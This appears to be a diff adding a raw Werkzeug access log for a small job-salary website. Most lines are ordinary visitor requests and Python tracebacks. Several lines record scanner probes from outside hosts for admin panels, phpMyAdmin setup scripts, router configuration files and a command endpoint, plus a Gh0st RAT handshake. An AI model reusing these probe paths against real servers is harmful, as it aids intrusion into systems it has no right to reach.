+73.158.132.230 - - [20/May/2017 01:22:22] "GET /vendor/font-awesome/css/font-awesome.min.css HTTP/1.1" 200 -
+73.158.132.230 - - [20/May/2017 01:22:22] "GET /vendor/magnific-popup/magnific-popup.css HTTP/1.1" 200 -
+73.158.132.230 - - [20/May/2017 01:22:22] "GET /css/creative.min.css HTTP/1.1" 200 -
+73.158.132.230 - - [20/May/2017 01:22:22] "GET /css/morphist.css HTTP/1.1" 200 -
+73.158.132.230 - - [20/May/2017 01:22:22] "GET /vendor/bootstrap/js/bootstrap.min.js HTTP/1.1" 200 -
+73.158.132.230 - - [20/May/2017 01:22:22] "GET /vendor/scrollreveal/scrollreveal.min.js HTTP/1.1" 200 -
+73.158.132.230 - - [20/May/2017 01:22:22] "GET /vendor/jquery/jquery.min.js HTTP/1.1" 200 -
+73.158.132.230 - - [20/May/2017 01:22:22] "GET /css/animate.min.css HTTP/1.1" 200 -
+73.158.132.230 - - [20/May/2017 01:22:22] "GET /vendor/magnific-popup/jquery.magnific-popup.min.js HTTP/1.1" 200 -
+73.158.132.230 - - [20/May/2017 01:22:23] "GET /js/creative.min.js HTTP/1.1" 200 -
+73.158.132.230 - - [20/May/2017 01:22:23] "GET /js/bokeh_style.js HTTP/1.1" 200 -
+73.158.132.230 - - [20/May/2017 01:22:23] "GET /js/app.js HTTP/1.1" 200 -
+73.158.132.230 - - [20/May/2017 01:22:23] "GET /js/morphist.min.js HTTP/1.1" 200 -
+73.158.132.230 - - [20/May/2017 01:22:23] "GET /img/header.jpg HTTP/1.1" 200 -
+73.158.132.230 - - [20/May/2017 01:22:23] "GET /vendor/font-awesome/fonts/fontawesome-webfont.woff2?v=4.6.3 HTTP/1.1" 200 -
+73.158.132.230 - - [20/May/2017 01:22:24] "POST /send_user_info HTTP/1.1" 200 -
+73.158.132.230 - - [20/May/2017 01:22:24] "GET /favicon.ico HTTP/1.1" 200 -
+img/data_science_scale_6_salary_dist.png
+73.158.132.230 - - [20/May/2017 01:25:30] "POST /get_job_stats HTTP/1.1" 200 -
+73.158.132.230 - - [20/May/2017 01:25:30] "GET /img/data_science_scale_6_salary_dist.png?1495243530665 HTTP/1.1" 200 -
+73.158.132.230 - - [20/May/2017 01:25:30] "GET /vendor/bootstrap/fonts/glyphicons-halflings-regular.woff2 HTTP/1.1" 200 -
+73.158.132.230 - - [20/May/2017 01:25:30] "POST /send_user_info HTTP/1.1" 200 -
+img/data_science_scale_6_salary_dist.png
+73.158.132.230 - - [20/May/2017 01:25:34] "POST /get_job_stats HTTP/1.1" 200 -
+73.158.132.230 - - [20/May/2017 01:25:34] "GET /img/data_science_scale_6_salary_dist.png?1495243534868 HTTP/1.1" 200 -
+73.158.132.230 - - [20/May/2017 01:25:34] "POST /send_user_info HTTP/1.1" 200 -
+103.248.220.101 - - [20/May/2017 03:19:42] "GET / HTTP/1.1" 200 -
+76.120.28.108 - - [20/May/2017 04:45:53] "GET /search_jobs.html HTTP/1.1" 304 -
+76.120.28.108 - - [20/May/2017 04:45:53] "GET /css/pace_big_counter.css HTTP/1.1" 304 -
+76.120.28.108 - - [20/May/2017 04:45:53] "GET /js/pace.min.js HTTP/1.1" 304 -
+76.120.28.108 - - [20/May/2017 04:45:53] "GET /js/app.js HTTP/1.1" 304 -
+76.120.28.108 - - [20/May/2017 04:45:53] "GET /js/bokeh_style.js HTTP/1.1" 304 -
+76.120.28.108 - - [20/May/2017 04:45:55] "POST /send_user_info HTTP/1.1" 200 -
+img/data_science_scale_6_salary_dist.png
+76.120.28.108 - - [20/May/2017 04:46:03] "POST /get_job_stats HTTP/1.1" 200 -
+76.120.28.108 - - [20/May/2017 04:46:04] "GET /img/data_science_scale_6_salary_dist.png?1495255564277 HTTP/1.1" 200 -
+76.120.28.108 - - [20/May/2017 04:46:04] "GET /vendor/bootstrap/fonts/glyphicons-halflings-regular.woff2 HTTP/1.1" 304 -
+76.120.28.108 - - [20/May/2017 04:46:04] "POST /send_user_info HTTP/1.1" 200 -
+76.120.28.108 - - [20/May/2017 04:49:09] "POST /send_user_info HTTP/1.1" 200 -
+img/data_science_scale_6_salary_dist.png
+76.120.28.108 - - [20/May/2017 04:49:14] "POST /get_job_stats HTTP/1.1" 200 -
+76.120.28.108 - - [20/May/2017 04:49:15] "GET /img/data_science_scale_6_salary_dist.png?1495255755633 HTTP/1.1" 200 -
+76.120.28.108 - - [20/May/2017 04:49:16] "POST /send_user_info HTTP/1.1" 200 -
+64.233.172.144 - - [20/May/2017 06:57:23] "GET / HTTP/1.1" 200 -
+64.233.172.146 - - [20/May/2017 06:57:23] "GET /favicon.ico HTTP/1.1" 200 -
+106.14.199.159 - - [20/May/2017 07:01:33] "GET /manager/html HTTP/1.1" 404 -
+109.225.41.161 - - [20/May/2017 16:52:24] "GET / HTTP/1.1" 200 -
+109.225.41.161 - - [20/May/2017 16:52:25] "GET http://www.msftncsi.com/ncsi.txt HTTP/1.1" 404 -
+109.225.41.161 - - [20/May/2017 16:52:25] "GET /HNAP1/ HTTP/1.1" 404 -
+139.162.119.197 - - [20/May/2017 18:34:44] "GET / HTTP/1.1" 200 -
+45.55.230.20 - - [20/May/2017 20:21:24] "GET / HTTP/1.1" 200 -
+35.184.253.142 - - [20/May/2017 21:41:18] "GET /RECORDINGS/ HTTP/1.1" 404 -
+54.166.83.205 - - [21/May/2017 02:42:39] "GET / HTTP/1.1" 200 -
+54.166.83.205 - - [21/May/2017 02:42:39] "GET /vendor/bootstrap/css/bootstrap.min.css HTTP/1.1" 200 -
+54.166.83.205 - - [21/May/2017 02:42:39] "GET /vendor/font-awesome/css/font-awesome.min.css HTTP/1.1" 200 -
+54.166.83.205 - - [21/May/2017 02:42:39] "GET /vendor/magnific-popup/magnific-popup.css HTTP/1.1" 200 -
+54.166.83.205 - - [21/May/2017 02:42:39] "GET /css/creative.min.css HTTP/1.1" 200 -
+54.166.83.205 - - [21/May/2017 02:42:39] "GET /vendor/jquery/jquery.min.js HTTP/1.1" 200 -
+54.166.83.205 - - [21/May/2017 02:42:39] "GET /vendor/bootstrap/js/bootstrap.min.js HTTP/1.1" 200 -
+54.166.83.205 - - [21/May/2017 02:42:39] "GET /vendor/scrollreveal/scrollreveal.min.js HTTP/1.1" 200 -
+54.166.83.205 - - [21/May/2017 02:42:39] "GET /vendor/magnific-popup/jquery.magnific-popup.min.js HTTP/1.1" 200 -
+54.166.83.205 - - [21/May/2017 02:42:39] "GET /js/creative.min.js HTTP/1.1" 200 -
+54.166.83.205 - - [21/May/2017 02:42:39] "GET /css/morphist.css HTTP/1.1" 200 -
+54.166.83.205 - - [21/May/2017 02:42:39] "GET /js/morphist.min.js HTTP/1.1" 200 -
+54.166.83.205 - - [21/May/2017 02:42:39] "GET /css/animate.min.css HTTP/1.1" 200 -
+54.166.83.205 - - [21/May/2017 02:42:40] "GET /img/header.jpg HTTP/1.1" 200 -
+54.166.83.205 - - [21/May/2017 02:42:40] "GET /vendor/font-awesome/fonts/fontawesome-webfont.woff?v=4.6.3 HTTP/1.1" 200 -
+95.221.54.170 - - [21/May/2017 03:21:23] "GET /search_jobs.html HTTP/1.1" 200 -
+95.221.54.170 - - [21/May/2017 03:21:35] "GET /vendor/font-awesome/css/font-awesome.min.css HTTP/1.1" 200 -
+95.221.54.170 - - [21/May/2017 03:21:35] "GET /vendor/magnific-popup/magnific-popup.css HTTP/1.1" 200 -
+95.221.54.170 - - [21/May/2017 03:21:35] "GET /vendor/bootstrap/css/bootstrap.min.css HTTP/1.1" 200 -
+95.221.54.170 - - [21/May/2017 03:21:35] "GET /vendor/bootstrap/js/bootstrap.min.js HTTP/1.1" 200 -
+95.221.54.170 - - [21/May/2017 03:21:35] "GET /css/pace_big_counter.css HTTP/1.1" 200 -
+95.221.54.170 - - [21/May/2017 03:21:35] "GET /vendor/jquery/jquery.min.js HTTP/1.1" 200 -
+95.221.54.170 - - [21/May/2017 03:21:35] "GET /css/creative.min.css HTTP/1.1" 200 -
+95.221.54.170 - - [21/May/2017 03:21:35] "GET /js/pace.min.js HTTP/1.1" 200 -
+95.221.54.170 - - [21/May/2017 03:21:35] "GET /css/morphist.css HTTP/1.1" 200 -
+95.221.54.170 - - [21/May/2017 03:21:35] "GET /js/creative.min.js HTTP/1.1" 200 -
+95.221.54.170 - - [21/May/2017 03:21:35] "GET /css/animate.min.css HTTP/1.1" 200 -
+95.221.54.170 - - [21/May/2017 03:21:35] "GET /js/app.js HTTP/1.1" 200 -
+95.221.54.170 - - [21/May/2017 03:21:35] "GET /js/bokeh_style.js HTTP/1.1" 200 -
+95.221.54.170 - - [21/May/2017 03:21:35] "GET /vendor/magnific-popup/jquery.magnific-popup.min.js HTTP/1.1" 200 -
+95.221.54.170 - - [21/May/2017 03:21:35] "GET /js/morphist.min.js HTTP/1.1" 200 -
+95.221.54.170 - - [21/May/2017 03:21:35] "GET /vendor/scrollreveal/scrollreveal.min.js HTTP/1.1" 200 -
+95.221.54.170 - - [21/May/2017 03:22:16] "GET /img/header.jpg HTTP/1.1" 200 -
+141.212.122.96 - - [21/May/2017 07:32:07] "GET /x HTTP/1.1" 404 -
+185.25.148.240 - - [21/May/2017 08:10:19] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 -
+190.129.35.227 - - [21/May/2017 10:05:56] "PROPFIND /webdav/ HTTP/1.1" 405 -
+106.14.199.159 - - [21/May/2017 10:22:56] "GET /manager/html HTTP/1.1" 404 -
+191.96.249.136 - - [21/May/2017 10:40:04] "GET /phpmyadmin/scripts/setup.php HTTP/1.0" 404 -
+222.186.58.161 - - [21/May/2017 10:44:54] "GET /manager/html HTTP/1.1" 404 -
+66.240.205.34 - - [21/May/2017 11:02:16] code 400, message Bad request syntax ("Gh0st\xad\x00\x00\x00\xe0\x00\x00\x00x\x9cKS``\x98\xc3\xc0\xc0\xc0\x06
+\xc4\x8c@\xbcQ\x96\x81\x81\tH\x07\xa7\x16\x95e&\xa7*\x04$&g+\x182\x94\xf6\xb000\xac\xa8rc\x00\x01\x11\xa0\x82\x1f\\`&\x83\xc7K7\x86\x19\xe5n\x0c9\x95n
+\x0c;\x84\x0f3\xac\xe8sch\xa8^\xcf4'J\x97\xa9\x82\xe30\xc3\x91h]&\x90\xf8\xce\x97S\xcbA4L?2=\xe1\xc4\x92\x86\x0b@\xf5`\x0cT\x1f\xae\xaf]")
+66.240.205.34 - - [21/May/2017 11:02:16] "Gh0st≠xúKS``ò¿¿ƒå@ºQñÅÅ        Hßïe&ß*$&g+2îˆ∞00¨®rc†Ç\`&É7Ü
+                           9ïn
+                              ;Ñ3¨ch®^'Jó©Ç√ëh]&ê¯ŒóS4L?2=íÜ
+                                                          @ı`
+                                                             TÆØ]" 400 -
+43.245.61.217 - - [21/May/2017 13:24:51] "GET / HTTP/1.1" 200 -
+----------------------------------------
+Exception happened during processing of request from ('62.210.149.84', 52866)
+Traceback (most recent call last):
+  File "/usr/lib/python2.7/SocketServer.py", line 596, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python2.7/SocketServer.py", line 331, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python2.7/SocketServer.py", line 652, in __init__
+    self.handle()
+  File "/usr/local/lib/python2.7/dist-packages/werkzeug/serving.py", line 228, in handle
+    rv = BaseHTTPRequestHandler.handle(self)
+  File "/usr/lib/python2.7/BaseHTTPServer.py", line 340, in handle
+    self.handle_one_request()
+  File "/usr/local/lib/python2.7/dist-packages/werkzeug/serving.py", line 259, in handle_one_request
+    self.raw_requestline = self.rfile.readline()
+IOError: [Errno 104] Connection reset by peer
+----------------------------------------
+222.186.58.161 - - [21/May/2017 16:23:50] "GET /manager/html HTTP/1.1" 404 -
+222.186.58.161 - - [21/May/2017 16:24:39] "GET /manager/html HTTP/1.1" 404 -
+24.234.146.228 - - [21/May/2017 18:31:09] "GET / HTTP/1.1" 200 -
+24.234.146.228 - - [21/May/2017 18:31:09] "GET /vendor/magnific-popup/magnific-popup.css HTTP/1.1" 200 -
+24.234.146.228 - - [21/May/2017 18:31:09] "GET /vendor/bootstrap/css/bootstrap.min.css HTTP/1.1" 200 -
+24.234.146.228 - - [21/May/2017 18:31:09] "GET /vendor/font-awesome/css/font-awesome.min.css HTTP/1.1" 200 -
+24.234.146.228 - - [21/May/2017 18:31:09] "GET /css/creative.min.css HTTP/1.1" 200 -
+24.234.146.228 - - [21/May/2017 18:31:09] "GET /css/morphist.css HTTP/1.1" 200 -
+24.234.146.228 - - [21/May/2017 18:31:09] "GET /vendor/jquery/jquery.min.js HTTP/1.1" 200 -
+24.234.146.228 - - [21/May/2017 18:31:09] "GET /vendor/bootstrap/js/bootstrap.min.js HTTP/1.1" 200 -
+24.234.146.228 - - [21/May/2017 18:31:09] "GET /css/animate.min.css HTTP/1.1" 200 -
+24.234.146.228 - - [21/May/2017 18:31:09] "GET /vendor/magnific-popup/jquery.magnific-popup.min.js HTTP/1.1" 200 -
+24.234.146.228 - - [21/May/2017 18:31:09] "GET /vendor/scrollreveal/scrollreveal.min.js HTTP/1.1" 200 -
+24.234.146.228 - - [21/May/2017 18:31:09] "GET /js/creative.min.js HTTP/1.1" 200 -
+24.234.146.228 - - [21/May/2017 18:31:09] "GET /js/morphist.min.js HTTP/1.1" 200 -
+24.234.146.228 - - [21/May/2017 18:31:09] "GET /vendor/font-awesome/fonts/fontawesome-webfont.woff2?v=4.6.3 HTTP/1.1" 200 -
+24.234.146.228 - - [21/May/2017 18:31:09] "GET /img/header.jpg HTTP/1.1" 200 -
+24.234.146.228 - - [21/May/2017 18:31:17] "GET /search_jobs.html HTTP/1.1" 200 -
+24.234.146.228 - - [21/May/2017 18:31:17] "GET /css/pace_big_counter.css HTTP/1.1" 200 -
+24.234.146.228 - - [21/May/2017 18:31:17] "GET /js/pace.min.js HTTP/1.1" 200 -
+24.234.146.228 - - [21/May/2017 18:31:17] "GET /js/bokeh_style.js HTTP/1.1" 200 -
+24.234.146.228 - - [21/May/2017 18:31:17] "GET /js/app.js HTTP/1.1" 200 -
+24.234.146.228 - - [21/May/2017 18:31:18] "POST /send_user_info HTTP/1.1" 200 -
+img/data_science_scale_6_salary_dist.png
+24.234.146.228 - - [21/May/2017 18:31:43] "POST /get_job_stats HTTP/1.1" 200 -
+24.234.146.228 - - [21/May/2017 18:31:43] "GET /img/data_science_scale_6_salary_dist.png?1495391503831 HTTP/1.1" 200 -
+24.234.146.228 - - [21/May/2017 18:31:44] "GET /vendor/bootstrap/fonts/glyphicons-halflings-regular.woff2 HTTP/1.1" 200 -
+24.234.146.228 - - [21/May/2017 18:31:44] "POST /send_user_info HTTP/1.1" 200 -
+img/data_science_scale_6_salary_dist.png
+24.234.146.228 - - [21/May/2017 18:31:49] "POST /get_job_stats HTTP/1.1" 200 -
+24.234.146.228 - - [21/May/2017 18:31:49] "GET /img/data_science_scale_6_salary_dist.png?1495391509613 HTTP/1.1" 200 -
+24.234.146.228 - - [21/May/2017 18:31:49] "POST /send_user_info HTTP/1.1" 200 -
+img/analyst_scale_6_salary_dist.png
+24.234.146.228 - - [21/May/2017 18:34:41] "POST /get_job_stats HTTP/1.1" 200 -
+Error on request:
+Traceback (most recent call last):
+  File "/usr/local/lib/python2.7/dist-packages/werkzeug/serving.py", line 205, in run_wsgi
+    execute(self.server.app)
+  File "/usr/local/lib/python2.7/dist-packages/werkzeug/serving.py", line 196, in execute
+    write(data)
+  File "/usr/local/lib/python2.7/dist-packages/werkzeug/serving.py", line 177, in write
+    self.wfile.write(data)
+IOError: [Errno 32] Broken pipe
+img/analyst_scale_6_salary_dist.png
+24.234.146.228 - - [21/May/2017 18:34:47] "POST /get_job_stats HTTP/1.1" 200 -
+Error on request:
+Traceback (most recent call last):
+  File "/usr/local/lib/python2.7/dist-packages/werkzeug/serving.py", line 205, in run_wsgi
+    execute(self.server.app)
+  File "/usr/local/lib/python2.7/dist-packages/werkzeug/serving.py", line 196, in execute
+    write(data)
+  File "/usr/local/lib/python2.7/dist-packages/werkzeug/serving.py", line 177, in write
+    self.wfile.write(data)
+IOError: [Errno 32] Broken pipe
+217.182.195.10 - - [21/May/2017 22:50:59] "GET / HTTP/1.1" 200 -
+217.182.195.10 - - [21/May/2017 22:50:59] "GET /robots.txt HTTP/1.1" 404 -
+185.110.132.239 - - [21/May/2017 23:16:38] "GET / HTTP/1.1" 200 -
+185.25.148.240 - - [21/May/2017 23:59:15] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 -
+139.162.124.167 - - [22/May/2017 00:48:37] "GET / HTTP/1.1" 200 -
+106.14.199.159 - - [22/May/2017 00:51:25] "GET /manager/html HTTP/1.1" 404 -
+123.206.102.241 - - [22/May/2017 01:52:10] "GET / HTTP/1.1" 200 -
+73.32.11.240 - - [22/May/2017 02:54:32] "GET / HTTP/1.1" 200 -
+73.32.11.240 - - [22/May/2017 02:54:32] "GET /vendor/bootstrap/css/bootstrap.min.css HTTP/1.1" 200 -
+73.32.11.240 - - [22/May/2017 02:54:33] "GET /css/creative.min.css HTTP/1.1" 200 -
+73.32.11.240 - - [22/May/2017 02:54:33] "GET /css/morphist.css HTTP/1.1" 200 -
+73.32.11.240 - - [22/May/2017 02:54:33] "GET /css/animate.min.css HTTP/1.1" 200 -
+73.32.11.240 - - [22/May/2017 02:54:33] "GET /vendor/font-awesome/css/font-awesome.min.css HTTP/1.1" 200 -
+73.32.11.240 - - [22/May/2017 02:54:33] "GET /vendor/magnific-popup/magnific-popup.css HTTP/1.1" 200 -
+73.32.11.240 - - [22/May/2017 02:54:33] "GET /vendor/jquery/jquery.min.js HTTP/1.1" 200 -
+73.32.11.240 - - [22/May/2017 02:54:33] "GET /vendor/bootstrap/js/bootstrap.min.js HTTP/1.1" 200 -
+73.32.11.240 - - [22/May/2017 02:54:33] "GET /vendor/magnific-popup/jquery.magnific-popup.min.js HTTP/1.1" 200 -
+73.32.11.240 - - [22/May/2017 02:54:33] "GET /vendor/scrollreveal/scrollreveal.min.js HTTP/1.1" 200 -
+73.32.11.240 - - [22/May/2017 02:54:33] "GET /js/creative.min.js HTTP/1.1" 200 -
+73.32.11.240 - - [22/May/2017 02:54:33] "GET /js/morphist.min.js HTTP/1.1" 200 -
+73.32.11.240 - - [22/May/2017 02:54:33] "GET /vendor/font-awesome/fonts/fontawesome-webfont.woff2?v=4.6.3 HTTP/1.1" 200 -
+73.32.11.240 - - [22/May/2017 02:54:33] "GET /img/header.jpg HTTP/1.1" 200 -
+73.32.11.240 - - [22/May/2017 02:54:34] "GET /favicon.ico HTTP/1.1" 200 -
+73.32.11.240 - - [22/May/2017 02:54:45] "GET /search_jobs.html HTTP/1.1" 200 -
+73.32.11.240 - - [22/May/2017 02:54:46] "GET /css/pace_big_counter.css HTTP/1.1" 200 -
+73.32.11.240 - - [22/May/2017 02:54:46] "GET /js/app.js HTTP/1.1" 200 -
+73.32.11.240 - - [22/May/2017 02:54:46] "GET /js/pace.min.js HTTP/1.1" 200 -
+73.32.11.240 - - [22/May/2017 02:54:46] "GET /js/bokeh_style.js HTTP/1.1" 200 -
+73.32.11.240 - - [22/May/2017 02:54:47] "POST /send_user_info HTTP/1.1" 200 -
+img/data_science_scale_6_salary_dist.png
+73.32.11.240 - - [22/May/2017 02:54:55] "POST /get_job_stats HTTP/1.1" 200 -
+73.32.11.240 - - [22/May/2017 02:54:55] "GET /vendor/bootstrap/fonts/glyphicons-halflings-regular.woff2 HTTP/1.1" 200 -
+73.32.11.240 - - [22/May/2017 02:54:55] "GET /img/data_science_scale_6_salary_dist.png?1495421544419 HTTP/1.1" 200 -
+73.32.11.240 - - [22/May/2017 02:54:56] "POST /send_user_info HTTP/1.1" 200 -
+54.202.163.125 - - [22/May/2017 06:18:43] "GET / HTTP/1.1" 200 -
+192.99.144.140 - - [22/May/2017 11:18:35] "PROPFIND /webdav/ HTTP/1.1" 405 -
+91.219.69.1 - - [22/May/2017 12:00:04] "GET /search_jobs.html HTTP/1.1" 200 -
+91.219.69.1 - - [22/May/2017 12:00:04] "GET /vendor/magnific-popup/magnific-popup.css HTTP/1.1" 200 -
+91.219.69.1 - - [22/May/2017 12:00:04] "GET /vendor/bootstrap/css/bootstrap.min.css HTTP/1.1" 200 -
+91.219.69.1 - - [22/May/2017 12:00:04] "GET /css/pace_big_counter.css HTTP/1.1" 200 -
+91.219.69.1 - - [22/May/2017 12:00:04] "GET /vendor/font-awesome/css/font-awesome.min.css HTTP/1.1" 200 -
+91.219.69.1 - - [22/May/2017 12:00:04] "GET /js/pace.min.js HTTP/1.1" 200 -
+91.219.69.1 - - [22/May/2017 12:00:04] "GET /css/creative.min.css HTTP/1.1" 200 -
+91.219.69.1 - - [22/May/2017 12:00:05] "GET /css/morphist.css HTTP/1.1" 200 -
+91.219.69.1 - - [22/May/2017 12:00:05] "GET /css/animate.min.css HTTP/1.1" 200 -
+91.219.69.1 - - [22/May/2017 12:00:05] "GET /vendor/jquery/jquery.min.js HTTP/1.1" 200 -
+91.219.69.1 - - [22/May/2017 12:00:05] "GET /vendor/bootstrap/js/bootstrap.min.js HTTP/1.1" 200 -
+91.219.69.1 - - [22/May/2017 12:00:05] "GET /vendor/scrollreveal/scrollreveal.min.js HTTP/1.1" 200 -
+91.219.69.1 - - [22/May/2017 12:00:05] "GET /vendor/magnific-popup/jquery.magnific-popup.min.js HTTP/1.1" 200 -
+91.219.69.1 - - [22/May/2017 12:00:05] "GET /js/creative.min.js HTTP/1.1" 200 -
+91.219.69.1 - - [22/May/2017 12:00:05] "GET /js/app.js HTTP/1.1" 200 -
+91.219.69.1 - - [22/May/2017 12:00:05] "GET /js/bokeh_style.js HTTP/1.1" 200 -
+91.219.69.1 - - [22/May/2017 12:00:05] "GET /js/morphist.min.js HTTP/1.1" 200 -
+91.219.69.1 - - [22/May/2017 12:00:06] "GET /img/header.jpg HTTP/1.1" 200 -
+91.219.69.1 - - [22/May/2017 12:00:06] "GET /vendor/font-awesome/fonts/fontawesome-webfont.woff2?v=4.6.3 HTTP/1.1" 200 -
+91.219.69.1 - - [22/May/2017 12:00:07] "POST /send_user_info HTTP/1.1" 200 -
+91.219.69.1 - - [22/May/2017 12:00:07] "GET /favicon.ico HTTP/1.1" 200 -
+img/data_science_scale_6_salary_dist.png
+91.219.69.1 - - [22/May/2017 12:05:32] "POST /get_job_stats HTTP/1.1" 200 -
+91.219.69.1 - - [22/May/2017 12:05:33] "GET /vendor/bootstrap/fonts/glyphicons-halflings-regular.woff2 HTTP/1.1" 200 -
+91.219.69.1 - - [22/May/2017 12:05:33] "GET /img/data_science_scale_6_salary_dist.png?1495454733226 HTTP/1.1" 200 -
+91.219.69.1 - - [22/May/2017 12:05:33] "POST /send_user_info HTTP/1.1" 200 -
+img/data_science_scale_6_salary_dist.png
+91.219.69.1 - - [22/May/2017 12:05:39] "POST /get_job_stats HTTP/1.1" 200 -
+91.219.69.1 - - [22/May/2017 12:05:41] "GET /img/data_science_scale_6_salary_dist.png?1495454741370 HTTP/1.1" 200 -
+91.219.69.1 - - [22/May/2017 12:05:42] "POST /send_user_info HTTP/1.1" 200 -
+139.162.108.53 - - [22/May/2017 14:34:18] "GET / HTTP/1.1" 200 -
+179.210.247.64 - - [22/May/2017 15:11:37] "GET /cgi/common.cgi HTTP/1.0" 404 -
+179.210.247.64 - - [22/May/2017 15:11:38] "GET /stssys.htm HTTP/1.0" 404 -
+179.210.247.64 - - [22/May/2017 15:11:38] "GET / HTTP/1.0" 200 -
+179.210.247.64 - - [22/May/2017 15:11:39] "POST /command.php HTTP/1.0" 405 -
+123.56.218.29 - - [22/May/2017 15:21:51] "GET /w00tw00t.at.blackhats.romanian.anti-sec:) HTTP/1.1" 404 -
+123.56.218.29 - - [22/May/2017 15:21:51] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 404 -
+123.56.218.29 - - [22/May/2017 15:21:52] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 -
+123.56.218.29 - - [22/May/2017 15:21:52] "GET /pma/scripts/setup.php HTTP/1.1" 404 -
+123.56.218.29 - - [22/May/2017 15:21:53] "GET /myadmin/scripts/setup.php HTTP/1.1" 404 -
+123.56.218.29 - - [22/May/2017 15:21:53] "GET /MyAdmin/scripts/setup.php HTTP/1.1" 404 -
+123.56.218.29 - - [22/May/2017 15:21:54] "GET  HTTP/1.1" 404 -
+185.25.148.240 - - [22/May/2017 16:15:21] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 -
+----------------------------------------
+Exception happened during processing of request from ('62.210.149.83', 53900)
+Traceback (most recent call last):
+  File "/usr/lib/python2.7/SocketServer.py", line 596, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python2.7/SocketServer.py", line 331, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python2.7/SocketServer.py", line 652, in __init__
+    self.handle()
+  File "/usr/local/lib/python2.7/dist-packages/werkzeug/serving.py", line 228, in handle
+    rv = BaseHTTPRequestHandler.handle(self)
+  File "/usr/lib/python2.7/BaseHTTPServer.py", line 340, in handle
+    self.handle_one_request()
+  File "/usr/local/lib/python2.7/dist-packages/werkzeug/serving.py", line 259, in handle_one_request
+    self.raw_requestline = self.rfile.readline()
+IOError: [Errno 104] Connection reset by peer
+----------------------------------------
+62.210.149.83 - - [22/May/2017 17:12:36] "HEAD /robots.txt HTTP/1.0" 404 -
+169.54.233.119 - - [22/May/2017 20:06:08] "GET / HTTP/1.1" 200 -
+31.210.102.114 - - [22/May/2017 22:51:29] "GET / HTTP/1.0" 200 -
+123.118.150.131 - - [23/May/2017 01:57:55] "GET / HTTP/1.1" 200 -
+66.90.150.30 - - [23/May/2017 03:26:54] "GET /search_jobs.html HTTP/1.1" 200 -
+66.90.150.30 - - [23/May/2017 03:26:54] "GET /css/pace_big_counter.css HTTP/1.1" 200 -
+66.90.150.30 - - [23/May/2017 03:26:54] "GET /vendor/font-awesome/css/font-awesome.min.css HTTP/1.1" 200 -
+66.90.150.30 - - [23/May/2017 03:26:54] "GET /vendor/magnific-popup/magnific-popup.css HTTP/1.1" 200 -
+66.90.150.30 - - [23/May/2017 03:26:54] "GET /vendor/bootstrap/css/bootstrap.min.css HTTP/1.1" 200 -
+66.90.150.30 - - [23/May/2017 03:26:54] "GET /css/creative.min.css HTTP/1.1" 200 -
+66.90.150.30 - - [23/May/2017 03:26:54] "GET /css/morphist.css HTTP/1.1" 200 -
+66.90.150.30 - - [23/May/2017 03:26:55] "GET /js/pace.min.js HTTP/1.1" 200 -
+66.90.150.30 - - [23/May/2017 03:26:55] "GET /css/animate.min.css HTTP/1.1" 200 -
+66.90.150.30 - - [23/May/2017 03:26:55] "GET /vendor/jquery/jquery.min.js HTTP/1.1" 200 -
+66.90.150.30 - - [23/May/2017 03:26:55] "GET /vendor/bootstrap/js/bootstrap.min.js HTTP/1.1" 200 -
+66.90.150.30 - - [23/May/2017 03:26:55] "GET /vendor/scrollreveal/scrollreveal.min.js HTTP/1.1" 200 -
+66.90.150.30 - - [23/May/2017 03:26:55] "GET /vendor/magnific-popup/jquery.magnific-popup.min.js HTTP/1.1" 200 -
+66.90.150.30 - - [23/May/2017 03:26:55] "GET /js/creative.min.js HTTP/1.1" 200 -
+66.90.150.30 - - [23/May/2017 03:26:55] "GET /js/app.js HTTP/1.1" 200 -
+66.90.150.30 - - [23/May/2017 03:26:55] "GET /js/bokeh_style.js HTTP/1.1" 200 -
+66.90.150.30 - - [23/May/2017 03:26:55] "GET /js/morphist.min.js HTTP/1.1" 200 -
+66.90.150.30 - - [23/May/2017 03:26:55] "GET /vendor/font-awesome/fonts/fontawesome-webfont.woff2?v=4.6.3 HTTP/1.1" 200 -
+66.90.150.30 - - [23/May/2017 03:26:55] "GET /img/header.jpg HTTP/1.1" 200 -
+66.90.150.30 - - [23/May/2017 03:26:56] "POST /send_user_info HTTP/1.1" 200 -
+66.90.150.30 - - [23/May/2017 03:26:56] "GET /favicon.ico HTTP/1.1" 200 -
+img/data_science_scale_6_salary_dist.png
+66.90.150.30 - - [23/May/2017 03:27:07] "POST /get_job_stats HTTP/1.1" 200 -
+66.90.150.30 - - [23/May/2017 03:27:07] "GET /vendor/bootstrap/fonts/glyphicons-halflings-regular.woff2 HTTP/1.1" 200 -
+66.90.150.30 - - [23/May/2017 03:27:08] "GET /img/data_science_scale_6_salary_dist.png?1495510029704 HTTP/1.1" 200 -
+66.90.150.30 - - [23/May/2017 03:27:08] "POST /send_user_info HTTP/1.1" 200 -
+img/data_science_scale_6_salary_dist.png
+66.90.150.30 - - [23/May/2017 03:27:10] "POST /get_job_stats HTTP/1.1" 200 -
+66.90.150.30 - - [23/May/2017 03:27:11] "POST /send_user_info HTTP/1.1" 200 -
+66.90.150.30 - - [23/May/2017 03:27:11] "GET /img/data_science_scale_6_salary_dist.png?1495510033313 HTTP/1.1" 200 -
+163.172.101.177 - - [23/May/2017 05:08:23] "GET / HTTP/1.1" 200 -
+141.212.122.96 - - [23/May/2017 11:13:22] "GET / HTTP/1.1" 200 -
+13.124.129.26 - - [23/May/2017 15:28:04] "GET /rom-0 HTTP/1.1" 404 -
+120.151.17.70 - - [23/May/2017 16:02:38] "GET / HTTP/1.0" 200 -
+139.162.124.167 - - [23/May/2017 16:16:41] "GET / HTTP/1.1" 200 -
+54.193.113.88 - - [23/May/2017 16:36:19] "GET /rom-0 HTTP/1.1" 404 -
+93.174.95.47 - - [23/May/2017 20:46:21] "GET /w00tw00t.at.blackhats.romanian.anti-sec:) HTTP/1.1" 404 -
+93.174.95.47 - - [23/May/2017 20:46:21] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 404 -
